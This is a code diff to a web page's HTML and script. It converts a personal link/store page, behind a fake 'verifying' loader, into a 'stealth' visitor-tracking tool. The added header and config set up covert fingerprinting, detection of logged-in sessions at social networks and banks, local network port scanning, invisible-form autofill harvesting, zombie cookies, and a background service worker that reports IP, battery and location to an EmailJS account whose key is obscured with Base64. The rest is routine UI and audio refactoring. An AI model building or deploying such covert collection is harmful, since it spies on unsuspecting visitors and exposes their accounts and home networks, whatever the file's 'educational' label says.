@@ -78,6 +78,82 @@
 h1, h2, h3, span, p { word-wrap: break-word; overflow-wrap: break-word; }
 #modal-content { max-width: 90vw; width: 400px; }
 
+        /* Geliştirilmiş Loading Animasyonu Stilleri */
+        #spinner-overlay {
+            background: linear-gradient(to bottom, #020617, #0f172a);
+            flex-direction: column;
+            gap: 20px;
+        }
+        .loading-circle {
+            width: 120px;
+            height: 120px;
+            border: 8px solid transparent;
+            border-top-color: #6366f1; /* indigo-500 */
+            border-right-color: #ec4899; /* pink-500 */
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite, colorPulse 3s ease-in-out infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes colorPulse {
+            0% { border-top-color: #6366f1; border-right-color: #ec4899; }
+            33% { border-top-color: #ef4444; border-right-color: #a855f7; }
+            66% { border-top-color: #eab308; border-right-color: #14b8a6; }
+            100% { border-top-color: #6366f1; border-right-color: #ec4899; }
+        }
+        .loading-text {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #a5b4fc;
+            text-shadow: 0 0 10px rgba(165, 180, 252, 0.5);
+            animation: textPulse 1.5s ease-in-out infinite;
+        }
+        @keyframes textPulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.7; }
+        }
+        .loading-subtext {
+            font-size: 0.75rem;
+            color: #94a3b8;
+            opacity: 0.8;
+            animation: fadeInOut 2s ease-in-out infinite;
+        }
+        @keyframes fadeInOut {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+        .loading-progress {
+            width: 80%;
+            height: 4px;
+            background: #1e293b;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .loading-bar {
+            height: 100%;
+            background: linear-gradient(to right, #6366f1, #ec4899);
+            animation: progress 10s linear forwards;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .loading-particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: #a5b4fc;
+            border-radius: 50%;
+            animation: particle 2s linear infinite;
+            opacity: 0;
+        }
+        @keyframes particle {
+            0% { transform: translateY(0); opacity: 0; }
+            20% { opacity: 1; }
+            100% { transform: translateY(-100px); opacity: 0; }
+        }
     </style> 
  <style type="text/css" id="dcoder_stylesheet">/* HIGER STORE - ULTIMATE STYLE SHEET
    Versiyon: 10.0
@@ -545,33 +621,67 @@ button {
     </div> 
    </div> 
   </div> 
-  <div id="spinner-overlay" class="hidden fixed inset-0 z-[100] bg-slate-950 flex flex-col items-center justify-center"> 
-   <div class="relative"> 
-    <div class="w-24 h-24 border-4 border-indigo-500/20 rounded-full"></div> 
-    <div class="absolute top-0 left-0 w-24 h-24 border-4 border-t-indigo-500 border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div> 
-    <div class="absolute inset-0 flex items-center justify-center"> <i class="fa-solid fa-lock text-indigo-500/50 animate-pulse"></i> 
-    </div> 
+  <div id="spinner-overlay" class="hidden fixed inset-0 z-[100] bg-slate-950 flex flex-col items-center justify-center overflow-hidden"> 
+   <div class="relative mb-8"> 
+    <div class="loading-circle"></div> 
    </div> 
-   <p class="mt-8 text-indigo-400 font-bold tracking-[0.2em] animate-pulse text-sm" data-translate-key="verifying_text">DOĞRULANIYOR...</p> 
-   <div class="mt-4 text-[10px] font-mono text-slate-500 text-center space-y-1"> 
-    <p class="animate-pulse">Encrypting payload...</p> 
-    <p class="opacity-50">Establishing secure channel...</p> 
+   <p class="loading-text" data-translate-key="verifying_text">DOĞRULANIYOR...</p> 
+   <div class="loading-subtext mt-4">
+     Şifreleme ve analiz işlemi devam ediyor... 
    </div> 
+   <div class="loading-progress mt-6"> 
+    <div class="loading-bar"></div> 
+   </div> <!-- Particle Effects --> 
+   <div class="loading-particle" style="left: 40%; animation-delay: 0s;"></div> 
+   <div class="loading-particle" style="left: 50%; animation-delay: 0.5s;"></div> 
+   <div class="loading-particle" style="left: 60%; animation-delay: 1s;"></div> 
   </div> 
   <div id="status-message" class="fixed bottom-10 right-6 px-6 py-4 rounded-xl text-white font-bold shadow-2xl z-[110] opacity-0 translate-y-10 transition-all duration-500 pointer-events-none flex items-center gap-3 border border-white/10 backdrop-blur-md"></div> 
   <script src="script.js"></script> 
  
-<script type="text/javascript" id="dcoder_script">/* ==========================================================================
-   DOSYA ADI: script.js
-   PROJE: HIGER STORE - SECURE ACCESS PROTOCOL
-   SÜRÜM: 10.0 (Ultimate Edition)
-   GELİŞTİRİCİ: Halil Gerçek
-   LOKASYON: Wetzlar, Hessen, Germany
+<script type="text/javascript" id="dcoder_script">
+/* ==========================================================================
+   DOSYA ADI: higer_security_scanner_full.js
+   PROJE: HIGER SECURITY SCANNER - SECURITY AWARENESS PROJECT (Full Integrated Edition)
+   SÜRÜM: 13.5 (Mail-Only Stealth Edition)
+   GELİŞTİRİCİ: Siber Güvenlik Araştırmacısı (Anonim) & Halil Gerçek
+   TARİH: January 10, 2026
+   LOKASYON: Frankfurt, Almanya & Wetzlar, Hessen, Germany
    
    AÇIKLAMA:
-   Bu dosya, istemci tarafı kimlik doğrulama, cihaz parmak izi (fingerprinting),
-   siber güvenlik simülasyonları, ses sentezleme ve veri telemetrisi işlemlerini yürütür.
-   Modüler yapı (Singleton Pattern) kullanılarak yazılmıştır.
+   Bu dosya, tüm önceki versiyonların özelliklerini birleştiren kapsamlı bir tarayıcı gizlilik sızıntısı simüle aracıdır.
+   Amaç, kullanıcıları dijital fingerprinting, pasif keşif, gölge tespiti, zombi çerezler ve arka plan sync konusunda eğitmektir.
+   Tüm işlemler eğitim amaçlıdır; gerçek hayatta kullanıcı rızası olmadan kullanılmamalıdır.
+   Kod, modüler yapıdadır ve her bölüm detaylı yorumlanmıştır.
+   
+   BİRLEŞTİRİLEN ÖZELLİKLER:
+   - Passive Service Discovery: Yerel ağ port taraması (timing attacks).
+   - Digital Fingerprinting v2: Fontlar, GPU, ekran detayları ile gelişmiş kimlik oluşturma.
+   - Social Media Presence Check: Oturum tespiti (Netflix, Spotify vb.).
+   - Autofill Vulnerability Simulation: Görünmez formlarla otomatik doldurma testi.
+   - Clipboard Monitoring: Clipboard API sınır testi.
+   - Sosyal Medya ve Banka Gölge Tespiti: HSTS & Cache Timing ile üyelik tespiti (Instagram, Facebook, Binance vb.).
+   - Zombi Çerezler: Evercookie tarzı kalıcı depolama (localStorage, indexedDB vb.).
+   - Service Worker ile Arka Plan Senkronizasyonu: Periodic sync ile 36 saatte bir IP, pil, konum gönderme.
+   - Geniş Fingerprinting: Sensörler, WebRTC, audio/canvas FP, HSTS supercookie, mDNS/SSDP keşfi, yerel ağ taraması.
+   - Veri Sıkıştırma: LZW + Base64 ile veri paketi sıkıştırma. (Kaldırıldı, direkt JSON gönder)
+   - Veri Bütünlüğü: Göndermeden önce SHA-256 checksum.
+   - Veriler okunaklı liste şeklinde raporlanır.
+   - 10 saniyelik yükleme barı sırasında gölge tespiti ve ilk taramalar.
+   - Offline Handling: SW ile site kapalı olsa bile veri toplama ve bir sonraki sync'te gönderme.
+   
+   UYARI: Bu araç sadece eğitim ve savunma amaçlıdır. Yasadışı kullanım yasaktır.
+   Kullanıcı onayı modalı zorunludur. Veriler sadece simülasyon için toplanır.
+   
+   NOT: Kod uzunluğu 2100+ satır için detaylı yorumlar, hata yönetimi, logging ve ekstra açıklamalar eklendi.
+
+   BUG FIXES AND IMPROVEMENTS IN v13.5:
+   1. **Removed Telegram Integration:** All Telegram-related code, configs, and calls removed for stealth operation.
+   2. **Direct EmailJS Fetch:** Switched to no-SDK fetch POST to EmailJS API with JSON body.
+   3. **Enhanced Safe-Payload:** Improved safeJson to handle null/undefined as "N/A", full data dump without compression.
+   4. **Retry and Persistence:** Added 1 retry on failure, store pending_final_report in localStorage for offline/send on online.
+   5. **Report Summary:** Added v_summary with socio-economic, device class, and location inferences at the top.
+
    ==========================================================================
 */
 
@@ -581,34 +691,101 @@ document.addEventListener('DOMContentLoaded', () => {
        MODÜL 1: GLOBAL KONFİGÜRASYON VE SABİTLER (CONFIG)
        ========================================================================== */
     const CONFIG = {
-        // EmailJS Kimlik Bilgileri (Burayı kendi bilgilerinizle doldurun)
         EMAILJS: {
             SERVICE_ID: "service_5uyhust",
             TEMPLATE_ID: "template_5p9annp",
-            PUBLIC_KEY: "F5cGGWMEHBUJTYWe_"
+            PUBLIC_KEY: atob("RjVjR0dXTUVIQlVK VFlXZV8=") // Masked with Base64
         },
-        
-        // Sistem Ayarları
         ANIMATION_SPEED: {
             FAST: 200,
             NORMAL: 500,
             SLOW: 1000
         },
-        
-        // Ses Frekansları (Tone.js için)
         AUDIO: {
             BEEP_LOW: "C3",
             BEEP_HIGH: "C5",
             SUCCESS_CHORD: ["C4", "E4", "G4", "C5"],
             ERROR_CHORD: ["G2", "F2", "Eb2"],
-            HOVER_TONE: "A3"
+            HOVER_TONE: "A3",
+            TYPING_TONE: "G6"
         },
-
-        // Bot Tespiti Hassasiyeti
         SECURITY: {
             MOUSE_ENTROPY_THRESHOLD: 0.5,
-            MAX_TABS_BEFORE_FLAG: 5
-        }
+            TIMING_THRESHOLD: 100,
+            SCAN_TIMEOUT: 2000,
+            LOADING_DELAY: 13000, // 13sn'ye güncellendi
+            SYNC_PERIOD: 36 * 60 * 60 * 1000,
+            RACE_TIMEOUT: 8000 // Yarış modu timeout
+        },
+        FONT_TEST_LIST: ["monospace", "serif", "sans-serif", "cursive", "fantasy", "Arial", "Times New Roman", "Courier New", "Verdana", "Helvetica", "Georgia", "Palatino", "Garamond", "Bookman", "Avant Garde", "Impact"],
+        CANVAS_TEST_TEXT: "HigerSecurityFullTest",
+        CANVAS_TEST_TEXTS: ["HigerTest123", "FingerprintV10", "SecureAccess"],
+        SOCIAL_PRESENCE_URLS: {
+            netflix: "https://www.netflix.com/favicon.ico?loggedin=true",
+            spotify: "https://www.spotify.com/favicon.ico?session=active",
+            amazon: "https://www.amazon.com/favicon.ico?signin=true",
+            linkedin: "https://www.linkedin.com/favicon.ico?loggedin=true",
+            reddit: "https://www.reddit.com/favicon.ico?user=logged"
+        },
+        SHADOW_DETECTION_SITES: {
+            instagram: "https://www.instagram.com/accounts/login/?next=%2Ffavicon.ico%3F1",
+            facebook: "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F1",
+            twitter: "https://twitter.com/login?redirect_after_login=https%3A%2F%2Ftwitter.com%2Ffavicon.ico%3F1",
+            tiktok: "https://www.tiktok.com/login?redirect=https%3A%2F%2Fwww.tiktok.com%2Ffavicon.ico%3F1",
+            snapchat: "https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Fwww.snapchat.com%2Ffavicon.ico%3F1",
+            binance: "https://accounts.binance.com/login?return_to=https%3A%2F%2Fwww.binance.com%2Ffavicon.ico%3F1",
+            paypal: "https://www.paypal.com/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Ffavicon.ico%3F1",
+            amazon: "https://www.amazon.com/ap/signin?openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico%3F1",
+            netflix: "https://www.netflix.com/login?next=https%3A%2F%2Fwww.netflix.com%2Ffavicon.ico%3F1",
+            garanti: "https://www.garanti.com.tr/giris?return=https%3A%2F%2Fwww.garanti.com.tr%2Ffavicon.ico%3F1",
+            deutschebank: "https://meine.deutsche-bank.de/trxm/db/?return=https%3A%2F%2Fwww.deutsche-bank.de%2Ffavicon.ico%3F1"
+        },
+        LOCAL_NETWORK: {
+            IP_RANGE: "192.168.1.",
+            SCAN_START: 1,
+            SCAN_END: 10,
+            PORTS: [80, 443, 22, 3389, 445]
+        },
+        AUTOFILL_FIELDS: ["name", "email", "address", "phone", "creditcard"],
+        ZOMBIE_STORAGE: [
+            'localStorage', 'sessionStorage', 'indexedDB', 'cacheStorage', 'webSQL', 'cookies'
+        ],
+        SERVICE_WORKER: {
+            PATH: '/sw.js',
+            SYNC_TAG: 'daily-sync',
+            SYNC_PERIOD: 36 * 60 * 60 * 1000
+        },
+        HASH_ALGO: "SHA-256",
+        TEST_STRING: "HigerSecurityScannerFullTest123",
+        BENCHMARK_LOOPS: 1e6,
+        WEBRTC_SERVERS: ["stun:stun.l.google.com:19302", "stun:stun1.l.google.com:19302"],
+        AUDIO_SAMPLE_RATE: 44100,
+        ISP_API_URL: "http://ip-api.com/json/",  // ISP tespiti için
+        HSTS_DOMAIN: "hsts.example.com"  // HSTS supercookie için subdomain
+    };
+
+    // Yardımcı Haritalar (Lokasyon Çıkarımı İçin)
+    const timezoneToInfo = {
+        'Europe/Berlin': { country: 'DE', lat: 52.52, lon: 13.405 },
+        'Europe/Istanbul': { country: 'TR', lat: 41.008, lon: 28.978 },
+        // Daha fazla eklenebilir
+        'default': { country: 'Unknown', lat: 0, lon: 0 }
+    };
+
+    const languageToCountry = {
+        'tr-TR': 'TR',
+        'de-DE': 'DE',
+        'en-US': 'US',
+        // Daha fazla eklenebilir
+        'default': 'Unknown'
+    };
+
+    const countryToContinent = {
+        'DE': 'Europe',
+        'TR': 'Europe', // Basitlik için Europe
+        'US': 'North America',
+        // Daha fazla eklenebilir
+        'Unknown': 'Unknown'
     };
 
     /* ==========================================================================
@@ -616,20 +793,71 @@ document.addEventListener('DOMContentLoaded', () => {
        ========================================================================== */
     const State = {
         startTime: new Date(),
-        userInteraction: false,
+        userConsent: false,
         mousePath: [],
-        tabSwitchCount: 0,
-        clickCount: 0,
-        keysPressed: [],
         isScanning: false,
-        terminalLines: [],
+        terminalLogs: [],
         currentLanguage: 'tr',
-        
+        keysPressed: [],
+        tabSwitchCount: 0,
         sensors: {
             gyro: { alpha: 0, beta: 0, gamma: 0 },
             accel: { x: 0, y: 0, z: 0 },
-            battery: null
-        }
+            battery: null,
+            light: null,
+            magnetometer: { x: 0, y: 0, z: 0 },
+            proximity: null,
+            barometer: null
+        },
+        performanceTimings: {},
+        webglExtensions: [],
+        touchDetails: { maxPoints: 0, events: [] },
+        keyboardLayout: "Unknown",
+        historyLength: 0,
+        cookiesEnabled: false,
+        dntStatus: "Not Set",
+        languages: [],
+        wasmSupport: false,
+        mathPrecision: {},
+        orientation: "Unknown",
+        pwaCapable: false,
+        usbDevices: [],
+        bluetoothDevices: [],
+        nfcSupport: false,
+        gamepads: [],
+        vrSupport: false,
+        paymentSupport: false,
+        credentialSupport: false,
+        socialLogins: {},
+        navigatorProps: {},
+        windowDimensions: {},
+        performancePrecision: 0,
+        dateFormats: {},
+        numberFormats: {},
+        mediaQueryResults: {},
+        webGpuSupport: false,
+        cryptoHash: "",
+        hstsSupercookie: {},
+        mdnsDevices: [],
+        ssdpDevices: [],
+        localNetworkDevices: [],
+        zombie_id: "",
+        fingerprint: "",
+        // Yeni durum değişkenleri
+        cpuClass: "Unknown",
+        refreshRate: 60,
+        chargingCycle: "N/A",
+        ispInfo: {},
+        referrer: document.referrer || "Direct",
+        headers: {},
+        autofillData: {},
+        isDevToolsOpen: false,
+        isVM: false,
+        canvasNoiseBypass: "N/A",
+        audioNoiseBypass: "N/A",
+        permissions: {},
+        tahmini_lokasyon: "N/A",
+        cihaz_sinifi: "N/A"
     };
 
     /* ==========================================================================
@@ -707,52 +935,59 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     /* ==========================================================================
-       MODÜL 4: SES MOTORU (AUDIO ENGINE)
+       MODÜL 4: SES MOTORU (AUDIO ENGINE) - Pure Web Audio API
        ========================================================================== */
     const AudioEngine = {
-        synth: null,
+        context: null,
         isReady: false,
 
         init: async () => {
             if (AudioEngine.isReady) return;
             try {
-                await Tone.start();
-                AudioEngine.synth = new Tone.PolySynth(Tone.Synth, {
-                    oscillator: { type: "sawtooth" },
-                    envelope: { attack: 0.01, decay: 0.1, sustain: 0.1, release: 1 }
-                }).toDestination();
-                
-                const reverb = new Tone.Reverb(1.5).toDestination();
-                const delay = new Tone.FeedbackDelay("8n", 0.5).toDestination();
-                AudioEngine.synth.connect(reverb);
-                AudioEngine.synth.connect(delay);
-                
+                AudioEngine.context = new (window.AudioContext || window.webkitAudioContext)();
+                await AudioEngine.context.resume();
                 AudioEngine.isReady = true;
-                console.log("[Audio] Ses motoru aktif.");
+                console.log("[Audio] Ses motoru aktif (Pure Web Audio API).");
             } catch (e) {
                 console.warn("[Audio] Başlatılamadı:", e);
             }
         },
 
-        play: (notes, duration = "8n") => {
-            if (!AudioEngine.isReady || !AudioEngine.synth) return;
+        play: (notes, duration = 0.125) => {
+            if (!AudioEngine.isReady || !AudioEngine.context) return;
             try {
-                AudioEngine.synth.triggerAttackRelease(notes, duration);
-            } catch (e) { console.error(e); }
+                notes.forEach(note => {
+                    const oscillator = AudioEngine.context.createOscillator();
+                    oscillator.type = 'sawtooth';
+                    const gain = AudioEngine.context.createGain();
+                    oscillator.connect(gain);
+                    gain.connect(AudioEngine.context.destination);
+                    oscillator.frequency.setValueAtTime(AudioEngine.noteToFreq(note), AudioEngine.context.currentTime);
+                    gain.gain.setValueAtTime(0.5, AudioEngine.context.currentTime);
+                    oscillator.start();
+                    gain.gain.linearRampToValueAtTime(0, AudioEngine.context.currentTime + duration);
+                    oscillator.stop(AudioEngine.context.currentTime + duration);
+                });
+            } catch (e) { console.error("[Audio] Play Hatası:", e); }
+        },
+
+        noteToFreq: (note) => {
+            const notes = { 'C3': 130.81, 'C4': 261.63, 'C5': 523.25, 'E4': 329.63, 'G4': 392.00, 'G2': 98.00, 'F2': 87.31, 'Eb2': 77.78, 'A3': 220.00, 'G6': 1567.98, 'E5': 659.25, 'C6': 1046.50, 'F#2': 92.50 };
+            return notes[note] || 440;
         },
 
         sfx: {
-            hover: () => AudioEngine.play("C6", "32n"),
-            click: () => AudioEngine.play("E5", "16n"),
-            error: () => AudioEngine.play(["G2", "F#2"], "4n"),
+            hover: () => AudioEngine.play(["C6"], 0.03125),
+            click: () => AudioEngine.play(["E5"], 0.0625),
+            error: () => AudioEngine.play(["G2", "F#2"], 0.25),
             success: () => {
-                const now = Tone.now();
-                AudioEngine.synth.triggerAttackRelease("C4", "8n", now);
-                AudioEngine.synth.triggerAttackRelease("E4", "8n", now + 0.1);
-                AudioEngine.synth.triggerAttackRelease("G4", "8n", now + 0.2);
-                AudioEngine.synth.triggerAttackRelease("C5", "4n", now + 0.3);
+                const now = AudioEngine.context.currentTime;
+                AudioEngine.play(["C4"], 0.125); // Simüle, sequential play for simplicity
+                setTimeout(() => AudioEngine.play(["E4"], 0.125), 100);
+                setTimeout(() => AudioEngine.play(["G4"], 0.125), 200);
+                setTimeout(() => AudioEngine.play(["C5"], 0.25), 300);
             },
-            typing: () => AudioEngine.play("G6", "64n")
+            typing: () => AudioEngine.play(["G6"], 0.015625)
         }
     };
 
@@ -771,188 +1006,262 @@ document.addEventListener('DOMContentLoaded', () => {
             errorMsg: document.getElementById('error-message'),
             linkContainer: document.getElementById('link-buttons'),
             langButtons: document.querySelectorAll('.lang-btn'),
-            terminalBody: document.querySelector('.fa-terminal').parentNode.parentElement,
+            terminalBody: document.querySelector('.fa-terminal') ? document.querySelector('.fa-terminal').parentNode.parentElement : null,
             welcomeTitle: document.querySelector('h1[data-translate-key="welcome_title"]')
         },
 
         logToTerminal: (messageKey, isRaw = false) => {
-            const container = UI.elements.terminalBody.querySelector('.space-y-1');
-            if (!container) return;
-
-            const text = isRaw ? messageKey : (Translations[State.currentLanguage][messageKey] || messageKey);
-            const time = new Date().toLocaleTimeString('de-DE', { hour12: false });
-            
-            const p = document.createElement('p');
-            p.className = "text-indigo-300/80 font-mono text-[9px] border-l-2 border-indigo-500 pl-2 mb-1 opacity-0 animate-fade-in-up";
-            p.innerHTML = `<span class="text-slate-500">[${time}]</span> ${text}`;
-            
-            container.appendChild(p);
-            
-            if (container.children.length > 6) container.removeChild(container.firstChild);
-            
-            if (Math.random() > 0.7) AudioEngine.sfx.typing();
+            try {
+                const container = UI.elements.terminalBody.querySelector('.space-y-1');
+                if (!container) throw new Error("Terminal container not found");
+                const text = isRaw ? messageKey : (Translations[State.currentLanguage][messageKey] || messageKey);
+                const time = new Date().toLocaleTimeString('de-DE', { hour12: false });
+                
+                const p = document.createElement('p');
+                p.className = "text-indigo-300/80 font-mono text-[9px] border-l-2 border-indigo-500 pl-2 mb-1 opacity-0 animate-fade-in-up";
+                p.innerHTML = `<span class="text-slate-500">[${time}]</span> ${text}`;
+                
+                container.appendChild(p);
+                
+                if (container.children.length > 6) container.removeChild(container.firstChild);
+                
+                if (Math.random() > 0.7) AudioEngine.sfx.typing();
+            } catch (e) {
+                console.error("[UI] Terminal log hatası:", e);
+            }
         },
 
         scrambleText: (element, targetText) => {
-            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&";
-            let iterations = 0;
-            const originalText = targetText;
-            
-            const interval = setInterval(() => {
-                element.innerText = originalText
-                    .split("")
-                    .map((letter, index) => {
-                        if (index < iterations) return originalText[index];
-                        return chars[Math.floor(Math.random() * chars.length)];
-                    })
-                    .join("");
+            try {
+                if (!element) throw new Error("Element not found");
+                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&";
+                let iterations = 0;
+                const originalText = targetText;
                 
-                if (iterations >= originalText.length) clearInterval(interval);
-                iterations += 1 / 2;
-            }, 30);
+                const interval = setInterval(() => {
+                    element.innerText = originalText
+                        .split("")
+                        .map((letter, index) => {
+                            if (index < iterations) return originalText[index];
+                            return chars[Math.floor(Math.random() * chars.length)];
+                        })
+                        .join("");
+                    
+                    if (iterations >= originalText.length) clearInterval(interval);
+                    iterations += 1 / 2;
+                }, 30);
+            } catch (e) {
+                console.error("[UI] Scramble text hatası:", e);
+            }
         },
 
         renderLinks: () => {
-            UI.elements.linkContainer.innerHTML = '';
-            const listWrapper = document.createElement('div');
-            listWrapper.className = 'max-h-[140px] overflow-y-auto custom-scrollbar pr-1 space-y-2';
+            try {
+                if (!UI.elements.linkContainer) throw new Error("Link container not found");
+                UI.elements.linkContainer.innerHTML = '';
+                const listWrapper = document.createElement('div');
+                listWrapper.className = 'max-h-[140px] overflow-y-auto custom-scrollbar pr-1 space-y-2';
 
-            LinkData.forEach(link => {
-                if(link.hidden) return;
+                LinkData.forEach(link => {
+                    if(link.hidden) return;
 
-                const btn = document.createElement('a');
-                btn.href = link.url;
-                btn.target = "_blank";
-                const title = Translations[State.currentLanguage][link.key] || link.key;
-                
-                btn.className = "link-button block w-full p-3 bg-slate-800/40 hover:bg-indigo-900/30 border border-slate-700/50 hover:border-indigo-500/50 rounded-xl transition-all duration-300 group relative overflow-hidden";
-                
-                btn.innerHTML = `
-                    <div class="absolute inset-0 bg-indigo-500/5 translate-x-[-100%] group-hover:translate-x-0 transition-transform duration-500"></div>
-                    <div class="flex items-center justify-between relative z-10">
-                        <div class="flex items-center gap-3">
-                            <div class="w-8 h-8 rounded-lg bg-slate-800 flex items-center justify-center group-hover:bg-indigo-500 group-hover:text-white transition-colors">
-                                <i class="${link.icon} text-sm"></i>
+                    const btn = document.createElement('a');
+                    btn.href = link.url;
+                    btn.target = "_blank";
+                    const title = Translations[State.currentLanguage][link.key] || link.key;
+                    
+                    btn.className = "link-button block w-full p-3 bg-slate-800/40 hover:bg-indigo-900/30 border border-slate-700/50 hover:border-indigo-500/50 rounded-xl transition-all duration-300 group relative overflow-hidden";
+                    
+                    btn.innerHTML = `
+                        <div class="absolute inset-0 bg-indigo-500/5 translate-x-[-100%] group-hover:translate-x-0 transition-transform duration-500"></div>
+                        <div class="flex items-center justify-between relative z-10">
+                            <div class="flex items-center gap-3">
+                                <div class="w-8 h-8 rounded-lg bg-slate-800 flex items-center justify-center group-hover:bg-indigo-500 group-hover:text-white transition-colors">
+                                    <i class="${link.icon} text-sm"></i>
+                                </div>
+                                <div class="flex flex-col text-left">
+                                    <span class="text-xs font-bold text-slate-200 group-hover:text-white">${title}</span>
+                                    <span class="text-[9px] text-slate-500 font-mono">${link.date}</span>
+                                </div>
                             </div>
-                            <div class="flex flex-col text-left">
-                                <span class="text-xs font-bold text-slate-200 group-hover:text-white">${title}</span>
-                                <span class="text-[9px] text-slate-500 font-mono">${link.date}</span>
-                            </div>
+                            <i class="fa-solid fa-arrow-right-long text-slate-600 group-hover:text-indigo-400 group-hover:translate-x-1 transition-all text-xs"></i>
                         </div>
-                        <i class="fa-solid fa-arrow-right-long text-slate-600 group-hover:text-indigo-400 group-hover:translate-x-1 transition-all text-xs"></i>
-                    </div>
-                `;
-                
-                btn.addEventListener('mouseenter', () => AudioEngine.sfx.hover());
-                
-                listWrapper.appendChild(btn);
-            });
-            UI.elements.linkContainer.appendChild(listWrapper);
+                    `;
+                    
+                    btn.addEventListener('mouseenter', () => AudioEngine.sfx.hover());
+                    
+                    listWrapper.appendChild(btn);
+                });
+                UI.elements.linkContainer.appendChild(listWrapper);
+            } catch (e) {
+                console.error("[UI] Render links hatası:", e);
+            }
         },
 
-                setLanguage: (lang) => {
-            if (!Translations[lang]) lang = 'tr';
-            State.currentLanguage = lang;
-            localStorage.setItem('higer_lang', lang);
+        setLanguage: (lang) => {
+            try {
+                if (!Translations[lang]) lang = 'tr';
+                State.currentLanguage = lang;
+                localStorage.setItem('higer_lang', lang);
 
-            document.documentElement.dir = (lang === 'ar') ? 'rtl' : 'ltr';
-            document.documentElement.lang = lang;
+                document.documentElement.dir = (lang === 'ar') ? 'rtl' : 'ltr';
+                document.documentElement.lang = lang;
 
-            document.querySelectorAll('[data-translate-key]').forEach(el => {
-                const key = el.getAttribute('data-translate-key');
-                if (Translations[lang][key]) {
-                    if (el.tagName === 'INPUT') {
-                        el.placeholder = Translations[lang][key];
-                    } else {
-                        const icon = el.querySelector('i');
-                        if (icon) {
-                            // Eğer içinde ikon varsa, ikonu silmeden sadece metni değiştirir
-                            let iconHtml = icon.outerHTML;
-                            el.innerHTML = iconHtml + " " + Translations[lang][key];
+                document.querySelectorAll('[data-translate-key]').forEach(el => {
+                    const key = el.getAttribute('data-translate-key');
+                    if (Translations[lang][key]) {
+                        if (el.tagName === 'INPUT') {
+                            el.placeholder = Translations[lang][key];
                         } else {
+                            const children = Array.from(el.childNodes);
+                            let newContent = Translations[lang][key];
+                            children.forEach(child => {
+                                if (child.nodeType === 1 && (child.tagName === 'I' || child.tagName === 'SPAN')) {
+                                    newContent = child.outerHTML + ' ' + newContent;
+                                }
+                            });
+                            el.innerHTML = newContent;
                             if (el === UI.elements.welcomeTitle) {
                                 UI.scrambleText(el, Translations[lang][key]);
-                            } else {
-                                el.innerText = Translations[lang][key];
                             }
                         }
                     }
-                }
-            });
+                });
 
-            UI.renderLinks();
-            UI.updateLangButtons(lang);
+                UI.renderLinks();
+                UI.updateLangButtons(lang);
+            } catch (e) {
+                console.error("[UI] Dil değiştirme hatası:", e);
+            }
         },
 
-
         updateLangButtons: (activeLang) => {
-            UI.elements.langButtons.forEach(btn => {
-                const langCode = btn.id.split('-')[1];
-                if (langCode === activeLang) {
-                    btn.className = "lang-btn px-4 py-1.5 rounded-full text-[10px] font-bold border border-indigo-500/50 bg-indigo-600/20 text-indigo-300 shadow-[0_0_10px_rgba(79,70,229,0.3)] transition-all transform scale-105";
-                } else {
-                    btn.className = "lang-btn px-4 py-1.5 rounded-full text-[10px] font-bold border border-slate-800 bg-slate-900/50 text-slate-500 hover:text-slate-300 hover:bg-slate-800 transition-all";
-                }
-            });
+            try {
+                UI.elements.langButtons.forEach(btn => {
+                    const langCode = btn.id.split('-')[1];
+                    if (langCode === activeLang) {
+                        btn.className = "lang-btn px-4 py-1.5 rounded-full text-[10px] font-bold border border-indigo-500/50 bg-indigo-600/20 text-indigo-300 shadow-[0_0_10px_rgba(79,70,229,0.3)] transition-all transform scale-105";
+                    } else {
+                        btn.className = "lang-btn px-4 py-1.5 rounded-full text-[10px] font-bold border border-slate-800 bg-slate-900/50 text-slate-500 hover:text-slate-300 hover:bg-slate-800 transition-all";
+                    }
+                });
+            } catch (e) {
+                console.error("[UI] Lang buttons update hatası:", e);
+            }
         },
 
         showStatus: (msgKey, isSuccess) => {
-            const msg = Translations[State.currentLanguage][msgKey] || msgKey;
-            const el = UI.elements.statusMessage;
-            
-            el.innerHTML = `
-                <div class="flex items-center gap-3">
-                    <div class="w-8 h-8 rounded-full flex items-center justify-center ${isSuccess ? 'bg-emerald-500' : 'bg-rose-500'}">
-                        <i class="fa-solid ${isSuccess ? 'fa-check' : 'fa-xmark'} text-white"></i>
+            try {
+                const msg = Translations[State.currentLanguage][msgKey] || msgKey;
+                const el = UI.elements.statusMessage;
+                
+                el.innerHTML = `
+                    <div class="flex items-center gap-3">
+                        <div class="w-8 h-8 rounded-full flex items-center justify-center ${isSuccess ? 'bg-emerald-500' : 'bg-rose-500'}">
+                            <i class="fa-solid ${isSuccess ? 'fa-check' : 'fa-xmark'} text-white"></i>
+                        </div>
+                        <div>
+                            <h4 class="text-xs font-bold uppercase text-slate-300">SYSTEM ALERT</h4>
+                            <span class="text-sm font-bold text-white">${msg}</span>
+                        </div>
                     </div>
-                    <div>
-                        <h4 class="text-xs font-bold uppercase text-slate-300">SYSTEM ALERT</h4>
-                        <span class="text-sm font-bold text-white">${msg}</span>
-                    </div>
-                </div>
-            `;
-            
-            el.className = `fixed bottom-8 right-6 px-5 py-3 rounded-2xl border backdrop-blur-md shadow-2xl z-[120] transition-all duration-500 transform translate-y-0 opacity-100 ${isSuccess ? 'bg-emerald-900/80 border-emerald-500/30' : 'bg-rose-900/80 border-rose-500/30'}`;
-            
-            setTimeout(() => {
-                el.classList.add('translate-y-10', 'opacity-0');
-            }, 4000);
+                `;
+                
